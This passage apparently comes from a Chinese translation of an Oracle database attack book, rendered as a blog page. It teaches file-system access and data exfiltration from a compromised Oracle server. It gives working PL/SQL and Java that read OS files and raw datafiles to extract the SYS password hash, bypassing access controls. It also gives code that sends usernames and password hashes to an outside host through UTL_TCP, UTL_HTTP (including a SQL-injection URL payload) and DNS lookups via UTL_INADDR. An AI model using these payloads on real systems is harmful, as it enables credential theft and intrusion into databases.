class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE PROCEDURE READ_FILE(DIRNAME VARCHAR2, FNAME VARCHAR2)</span><br><span class="line">AS</span><br><span class="line">invalid_path EXCEPTION;</span><br><span class="line">access_denied EXCEPTION;</span><br><span class="line">PRAGMA EXCEPTION_INIT(invalid_path, -29280);</span><br><span class="line">PRAGMA EXCEPTION_INIT(access_denied, -29289);</span><br><span class="line">FD UTL_FILE.FILE_TYPE;</span><br><span class="line">BUFFER VARCHAR2(260);</span><br><span class="line">BEGIN</span><br><span class="line"></span><br><span class="line">        EXECUTE IMMEDIATE &#x27;CREATE OR REPLACE DIRECTORY RW_FILE AS &#x27;&#x27;&#x27; ||</span><br><span class="line">DIRNAME || &#x27;&#x27;&#x27;&#x27;;</span><br><span class="line">        FD := UTL_FILE.FOPEN(&#x27;RW_FILE&#x27;,FNAME,&#x27;r&#x27;);</span><br><span class="line">        DBMS_OUTPUT.ENABLE(1000000);</span><br><span class="line">        LOOP</span><br><span class="line">                UTL_FILE.GET_LINE(FD,BUFFER,254);</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(BUFFER);</span><br><span class="line">        END LOOP;</span><br><span class="line">        EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line"></span><br><span class="line">EXCEPTION WHEN invalid_path THEN</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;File location or path is</span><br><span class="line">invalid.&#x27;);</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">        WHEN access_denied THEN</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;Access is denied.&#x27;);</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">        WHEN NO_DATA_FOUND THEN</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;End of file.&#x27;);</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">        WHEN OTHERS THEN</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;There was an error.&#x27;);</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">EXEC READ_FILE(&#x27;C:\&#x27;,&#x27;boot.ini&#x27;);</span><br></pre></td></tr></table></figure><h3 id="使用Java访问文件系统"><a href="#使用Java访问文件系统" class="headerlink" title="使用Java访问文件系统"></a>使用Java访问文件系统</h3><p>使用 UTL_FILE 包访问文件系统要求用户有权访问 DIRECTORY 对象或创建 DIRECTORY 对象的权限。 使用 Java 不需要存在 DIRECTORY - 而是需要读写 java.io.FilePermission。 这可以通过调用 DBMS_JAVA.GRANT_PERMISSION 来授予：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission(&#x27;SCOTT&#x27;,</span><br><span class="line">&#x27;SYS:java.io.FilePermission&#x27;,&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;,&#x27;read&#x27;);</span><br><span class="line"></span><br><span class="line">exec dbms_java.grant_permission(&#x27;SCOTT&#x27;,</span><br><span class="line">&#x27;SYS:java.io.FilePermission&#x27;,&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;,&#x27;write&#x27;);</span><br></pre></td></tr></table></figure><p>以下代码使用户能够以 Oracle 用户的权限读取文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on</span><br><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAREADFILE&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVAREADFILE</span><br><span class="line">&#123;</span><br><span class="line">        public static void readfile(String filename) throws IOException</span><br><span class="line">        &#123;</span><br><span class="line">                FileReader f = new FileReader(filename);</span><br><span class="line">                BufferedReader fr = new BufferedReader(f);</span><br><span class="line">                String text = fr.readLine();;</span><br><span class="line">                while(text != null)</span><br><span class="line">                &#123;</span><br><span class="line">                        System.out.println(text);</span><br><span class="line">                        text = fr.readLine();</span><br><span class="line">                &#125;</span><br><span class="line">                fr.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAREADFILEPROC (p_filename IN VARCHAR2)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAREADFILE.readfile (java.lang.String)&#x27;;</span><br><span class="line">/</span><br><span class="line">exec dbms_java.set_output(2000);</span><br><span class="line">exec JAVAREADFILEPROC(&#x27;C:\boot.ini&#x27;)</span><br></pre></td></tr></table></figure><p>显然，前面的代码比使用 UTL_FILE 和使用那些讨厌的 DIRECTORY 对象调度要简洁得多。</p><h3 id="访问二进制文件"><a href="#访问二进制文件" class="headerlink" title="访问二进制文件"></a>访问二进制文件</h3><p>使用 Oracle 的 Java 访问基于二进制的文件有点奇怪——如果文件太大，它会使服务器的 CPU 以 100% 的速度旋转。 因此，在访问文件时，您需要以小块的形式进行。 以下代码将文件名作为其第一个参数，并将文件偏移量作为其第二个参数。 然后它从该偏移量中读取 512 个字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">SET ESCAPE ON</span><br><span class="line">SET ESCAPE &quot;\&quot;</span><br><span class="line">SET SERVEROUTPUT ON</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVAREADBINFILE&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVAREADBINFILE</span><br><span class="line">&#123;</span><br><span class="line">        public static void readbinfile(String f, int start) throws</span><br><span class="line">IOException</span><br><span class="line">      &#123;</span><br><span class="line">             FileInputStream fis;</span><br><span class="line">            DataInputStream dis;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                  int i;</span><br><span class="line">                  int ih,il;</span><br><span class="line">                  int cnt = 1, h=0,l=0;</span><br><span class="line">                  String hex[] = &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;,&quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;,</span><br><span class="line">&quot;8&quot;,&quot;9&quot;, &quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;,&quot; F&quot;&#125;;</span><br><span class="line"></span><br><span class="line">                  RandomAccessFile raf = new RandomAccessFile (f, &quot;r&quot;);</span><br><span class="line">                  raf.seek (start);</span><br><span class="line">                  for(i=0; i&lt;=512; i++)</span><br><span class="line">                  &#123;</span><br><span class="line"></span><br><span class="line">                        ih = il = raf.readByte() \&amp; 0xFF;</span><br><span class="line">                        h = ih &gt;&gt; 4;</span><br><span class="line">                        l = il \&amp; 0x0F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        System.out.print(&quot;\\\\x&quot; + hex[h] + hex[l]);</span><br><span class="line">                        if(cnt \% 16 == 0)</span><br><span class="line"></span><br><span class="line">                              System.out.println();</span><br><span class="line">                        cnt ++;</span><br><span class="line"></span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (EOFException eof)</span><br><span class="line">                  &#123;</span><br><span class="line">                  System.out.println();</span><br><span class="line">                  System.out.println(&quot;EOF reached &quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (IOException ioe)</span><br><span class="line">            &#123;</span><br><span class="line">                  System.out.println(&quot;IO error: &quot;+ ioe);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVAREADBINFILEPROC (p_filename IN</span><br><span class="line">VARCHAR2, p_start in number)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVAREADBINFILE.readbinfile (java.lang.String, int)&#x27;;</span><br><span class="line">/</span><br><span class="line">show errors</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>通过使用以下代码直接访问 Oracle 数据文件，您可以完全绕过数据库服务器强制执行的访问控制。 例如，以下输出显示访问 SYSTEM01.DBF 文件中存储 USER$ 表的部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">set serveroutput on</span><br><span class="line">exec dbms_java.set_output(2000);</span><br><span class="line">SQL&gt; exec</span><br><span class="line">JAVAREADBINFILEPROC(&#x27;C:\\oracle\\oradata\\orcl\\system01.DBF&#x27;,448767)</span><br><span class="line">\x53\x59\x53\x02\xC1\x02\x10\x30\x44\x34\x37\x42\x35\x35\x30\x43</span><br><span class="line">\x35\x46\x37\x30\x44\x45\x44\x01\x80\x02\xC1\x04\x07\x78\x69\x0A</span><br><span class="line">\x1B\x04\x3C\x23\x07\x78\x6A\x03\x11\x0E\x24\x12\xFF\xFF\x01\x80</span><br><span class="line">\xFF\x02\xC1\x02\xFF\xFF\x01\x80\x01\x80\x09\x53\x59\x53\x5F\x47</span><br><span class="line">\x52\x4F\x55\x50\x6C\x00\x11\x05\x06\x53\x59\x53\x54\x45\x4D\x02</span><br><span class="line">\xC1\x02\x10\x44\x34\x44\x46\x37\x39\x33\x31\x41\x42\x31\x33\x30</span><br><span class="line">\x45\x33\x37\x01\x80\x01\x80\x07\x78\x69\x0A\x1B\x04\x3C\x23\x07</span><br><span class="line">\x78\x69\x0A\x1B\x04\x3C\x23\xFF\xFF\x01\x80\xFF\x02\xC1\x02\xFF</span><br><span class="line">\xFF\x01\x80\x01\x80\x09\x53\x59\x53\x5F\x47\x52\x4F\x55\x50\x6C</span><br><span class="line">\x00\x11\x0E\x0C\x41\x51\x5F\x55\x53\x45\x52\x5F\x52\x4F\x4C\x45</span><br><span class="line">\x01\x80\xFF\x01\x80\x01\x80\x07\x78\x69\x0A\x1B\x05\x03\x3C\xFF</span><br><span class="line"></span><br><span class="line">\xFF\xFF\x01\x80\xFF\x02\xC1\x02\xFF\xFF\x01\x80\x01\x80\x16\x44</span><br><span class="line">\x45\x46\x41\x55\x4C\x54\x5F\x43\x4F\x4E\x53\x55\x4D\x45\x52\x5F</span><br><span class="line">\x47\x52\x4F\x55\x50\xAC\x00\x01\x01\x00\x01\x00\x00\x40\x00\x36</span><br><span class="line">\x00\x0F\x00\x40\x00\x36\x00\x0F\x02\xC1\x10\x6C\x00\x11\x0D\x15</span><br><span class="line">\x41\x51\x5F\x41\x44\x4D\x49\x4E\x49\x53\x54\x52\x41\x54\x4F\x52</span><br><span class="line">\x5F\x52\x4F\x4C\x45\x01\x80\xFF\x01\x80\x01\x80\x07\x78\x69\x0A</span><br><span class="line">\x1B\x05\x03\x3C\xFF\xFF\xFF\x01\x80\xFF\x02\xC1\x02\xFF\xFF\x01</span><br><span class="line">\x80\x01\x80\x16\x44\x45\x46\x41\x55\x4C\x54\x5F\x43\x4F\x4E\x53</span><br><span class="line">\x55\x4D\x45\x52\x5F\x47\x52\x4F\x55\x50\xAC\x00\x01\x01\x00\x01</span><br><span class="line">\x00\x00\x40\x00\x36\x00\x0E\x00\x40\x00\x36\x00\x0E\x02\xC1\x0F</span><br><span class="line">\x6C\x00\x07\x05\x01\x80\x01\x80\x02\xC1\x61\x01\x80\x01\x80\x01</span><br><span class="line">\x80\x01\x80\x6C\x00\x11\x0C\x16\x52\x45\x43\x4F\x56\x45\x52\x59</span><br><span class="line">\x5F\x43\x41\x54\x41\x4C\x4F\x47\x5F\x4F\x57\x4E\x45\x52\x01\x80</span><br><span class="line">\xFF\x01\x80\x01\x80\x07\x78\x69\x0A\x1B\x05\x02\x2C\xFF\xFF\xFF</span><br><span class="line">\x01\x80\xFF\x02\xC1\x02\xFF\xFF\x01\x80\x01\x80\x16\x44\x45\x46</span><br><span class="line">\x41\x55\x4C\x54\x5F\x43\x4F\x4E\x53\x55\x4D\x45\x52\x5F\x47\x52</span><br><span class="line">\x4F\x55\x50\xAC\x00\x01\x01\x00\x01\x00\x00\x40\x00\x36\x00\x0D</span><br></pre></td></tr></table></figure><p>如果您查看输出的第一行，前 3 个字节是 \x53\x59\x53 - 这是“SYS”。 跳过接下来的 4 个字节并取接下来的 16 个字节，您将得到以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x30\x44\x34\x37\x42\x35\x35\x30\x43\x35\x46\x37\x30\x44\x45\x44&quot;</span><br></pre></td></tr></table></figure><p>这转换为“0D47B550C5F70DED”，它是 SYS 用户的密码哈希。 确认这一点，您可以运行以下选择：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select password from dba_users where username = &#x27;SYS&#x27;;</span><br><span class="line"></span><br><span class="line">PASSWORD</span><br><span class="line">------------------------------</span><br><span class="line">0D47B550C5F70DED</span><br></pre></td></tr></table></figure><p>可以将代码包装在循环中以提取整个数据文件。 有关这方面的更多信息，请参阅第 12 章中的“数据泄露”部分。</p><h3 id="使用操作系统环境变量"><a href="#使用操作系统环境变量" class="headerlink" title="使用操作系统环境变量"></a>使用操作系统环境变量</h3><p>Oracle 10g 在 DBMS_SYSTEM 包中引入了一个名为 GET_ENV 的过程。 此过程采用环境变量的名称并返回其值。 它不会返回 PATH 环境变量的值，但是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE PROCEDURE DUMP_ENV AS</span><br><span class="line">BUFFER VARCHAR2(260);</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">        -- SYS.DBMS_SYSTEM.GET_ENV WON&#x27;T GIVE BACK THE</span><br><span class="line">        -- PATH ENVIRONMENT VARIABLE</span><br><span class="line"></span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;ORACLE_HOME&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;ORACLE_HOME: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;ORACLE_SID&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;ORACLE_SID: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;COMPUTERNAME&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;COMPUTERNAME: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;OS&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;OS: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;TEMP&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;TEMP: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;WINDIR&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;WINDIR: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;SYSTEMROOT&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;SYSTEMROOT: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;PROGRAMFILES&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;PROGRAMFILES: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;COMSPEC&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;COMSPEC: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;PROCESSOR_ARCHITECTURE&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;PROCESSOR_ARCHITECTURE: &#x27; || BUFFER);</span><br><span class="line">        SYS.DBMS_SYSTEM.GET_ENV(&#x27;PROCESSOR_IDENTIFIER&#x27;,BUFFER);</span><br><span class="line">        DBMS_OUTPUT.PUT_LINE(&#x27;PROCESSOR_IDENTIFIER: &#x27; || BUFFER);</span><br><span class="line"></span><br><span class="line">END DUMP_ENV;</span><br><span class="line">/</span><br><span class="line">EXEC DUMP_ENV;</span><br></pre></td></tr></table></figure><p>此过程产生以下输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ORACLE_HOME: C:\oracle\product\10.1.0\Db_1</span><br><span class="line">ORACLE_SID: orcl10g</span><br><span class="line">COMPUTERNAME: GLADIUS</span><br><span class="line">OS: Windows_NT</span><br><span class="line">TEMP: C:\WINDOWS\TEMP</span><br><span class="line">WINDIR: C:\WINDOWS</span><br><span class="line">SYSTEMROOT: C:\WINDOWS</span><br><span class="line">PROGRAMFILES: C:\Program Files</span><br><span class="line">COMSPEC: C:\WINDOWS\system32\cmd.exe</span><br><span class="line">PROCESSOR_ARCHITECTURE: x86</span><br><span class="line">PROCESSOR_IDENTIFIER: x86 Family 6 Model 9 Stepping 5, GenuineIntel</span><br></pre></td></tr></table></figure><h2 id="访问网络"><a href="#访问网络" class="headerlink" title="访问网络"></a>访问网络</h2><p>本章研究访问网络的目的是为了数据泄露以及从受感染的 Oracle 服务器攻击其他系统。</p><h3 id="数据泄漏"><a href="#数据泄漏" class="headerlink" title="数据泄漏"></a>数据泄漏</h3><p>数据泄露是在不被注意的情况下获取数据的过程。 这可能就像使用物理备份磁带一样简单，也可能像使用网络上的隐蔽通道一样复杂。 Joanna Rutkowska 开发了一种更复杂的隐蔽通道方法。 它被称为NUSHU，以中国妇女使用的一种古老的密语命名。 NUSHU，最近的一个，使用 TCP 初始序列号来隐藏加密数据。 虽然可以检测到 NUSHU（使用英国剑桥大学的 Steven J. Murdoch 和 Stephen Lewis 以及俄罗斯塔甘罗格州立大学的 Eugene Tumoian 和 Maxim Anikeev 开发的方法），但必须指出的是，这些方法是在 NUSHU 被开发之后才发表。</p><h4 id="使用-UTL-TCP"><a href="#使用-UTL-TCP" class="headerlink" title="使用 UTL_TCP"></a>使用 UTL_TCP</h4><p>UTL_TCP PL/SQL 包使 Oracle 服务器能够创建到指定 TCP 端口上的远程主机的出站连接。 因此，它是一种从数据库中提取数据的有用方法。 首先连接到给定主机上的给定 TCP 端口，然后一旦连接就可以传输数据。 不用说，如果 Oracle 服务器受到带有出口过滤功能的防火墙的保护，那么攻击者就需要确定哪些端口被允许出去。 这可以使用前面介绍的 TCP 端口扫描器来实现。 通常，远程管理端口（例如 22 (SSH) 和 3389（终端服务））以及网络基础设施端口（例如 TCP 53 (DNS)）通常是“开放的”。 发现可访问端口 25 (SMTP)、80 (HTTP) 和 443 (HTTPS) 的情况也并不少见。 以下代码演示了如何将 UTL_TCP 用作从数据库服务器提取数据的带外方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">TYPE C_TYPE IS REF CURSOR;</span><br><span class="line">CV C_TYPE;</span><br><span class="line">PASSWORD VARCHAR2(30);</span><br><span class="line">USERNAME VARCHAR2(30);</span><br><span class="line">C UTL_TCP.CONNECTION;</span><br><span class="line">L PLS_INTEGER;</span><br><span class="line">BEGIN</span><br><span class="line">C:= UTL_TCP.OPEN_CONNECTION(&#x27;192.168.0.10&#x27;,111,&#x27;US7ASCII&#x27;);</span><br><span class="line">OPEN CV FOR &#x27;SELECT USERNAME,PASSWORD FROM SYS.DBA_USERS&#x27;;</span><br><span class="line">LOOP</span><br><span class="line">      FETCH CV INTO USERNAME,PASSWORD;</span><br><span class="line">      L:=UTL_TCP.WRITE_LINE(C, USERNAME||&#x27;:&#x27;||PASSWORD);</span><br><span class="line">EXIT WHEN CV%NOTFOUND;</span><br><span class="line">END LOOP;</span><br><span class="line">CLOSE CV;</span><br><span class="line">UTL_TCP.CLOSE_CONNECTION(C);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>此代码连接到 192.168.0.10 上的 TCP 端口 111 (PortMapper)。 然后它从 DBA_USERS 中选择用户名和密码，将它们连接起来，然后通过网络发送它们。 然后连接关闭。 暂时忽略 DBMS_EXPORT_EXTENSION（参见第 5 章，“Oracle 和 PL/SQL”），像这样执行大块匿名 PL/SQL 大多只有在直接连接到数据库服务器时才可用； 它对 SQL 注入情况没有用。 然而，UTL_HTTP 可以。 我们接下来看看这个。</p><h4 id="使用-UTL-HTTP"><a href="#使用-UTL-HTTP" class="headerlink" title="使用 UTL_HTTP"></a>使用 UTL_HTTP</h4><p>UTL_HTTP 包可用于从 Oracle 数据库服务器向 Web 服务器发出带外请求。 请求函数接受一个 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_http.request(&#x27;http://192.168.0.100:5500/&#x27;||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME=&#x27;SYS&#x27;)) from dual;</span><br></pre></td></tr></table></figure><p>您可以在此处看到感兴趣的数据是 SYS 用户的密码。 选中后，它会发送到侦听 TCP 端口 5500 的远程 Web 服务器。 UTL_HTTP.REQUEST 在 SQL 注入场景中特别有用。 例如，假设一个应用程序正在连接 Oracle 后端，并且它容易受到搜索页面 FOO 参数中 SQL 注入的影响。 然后可以注入 UTL_HTTP.REQUEST 来窃取数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/search?FOO=BAR&#x27;||utl_http.request(&#x27;http://192.168.0.100:5500/&#x27;||(SELECT PASSWORD FROM DBA_USERS WHERE USERNAME=&#x27;SYS&#x27;))||&#x27;BAR</span><br></pre></td></tr></table></figure><p>其他可以非常有效地用于网络数据泄露的包是 UTL_MAIL、UTL_SMTP 和 UTL_INADDR。 特别令人感兴趣的是 UTL_INADDR，它可用于窃取伪装为 DNS 查询的数据。</p><h4 id="使用-DNS-查询和-UTL-INADDR"><a href="#使用-DNS-查询和-UTL-INADDR" class="headerlink" title="使用 DNS 查询和 UTL_INADDR"></a>使用 DNS 查询和 UTL_INADDR</h4><p>UTL_INADDR 包用于查找主机名和 IP 地址，并可用作另一种带外方法。如果服务器已配置了名称服务器（它们几乎总是如此！），则可以使用此包窃取数据。由于域名系统的工作方式，当名称服务器查询到它不知道的主机的 IP 地址时，它会将请求向上转发到负责相关域的名称服务器。例如，如果在连接到我的 ISP 时，我向我的 ISP 的名称服务器查询主机 xyzpqr.ngssoftware.com，那么如果它不在缓存中，它就会将请求转发到 NGS DNS服务器进行解析。 NGS DNS服务器将回复主机的 IP 地址——当然，如果它存在的话。如果您拥有<strong>DNS服务器</strong>，因此可以访问日志或能够捕获离线流量，那么您可以通过 UDP 端口 53 从数据库服务器发送数据 - 当然，假设防火墙设置允许数据库服务器名称查找。</p><p>执行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT PASSWORD FROM DBA_USERS WHERE USERNAME=&#x27;SYS&#x27;)||&#x27;.ngssoftware.com&#x27;) FROM DUAL;</span><br></pre></td></tr></table></figure><p>导致服务器查询 0D47B550C5F70DED.ngssoftware.com：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 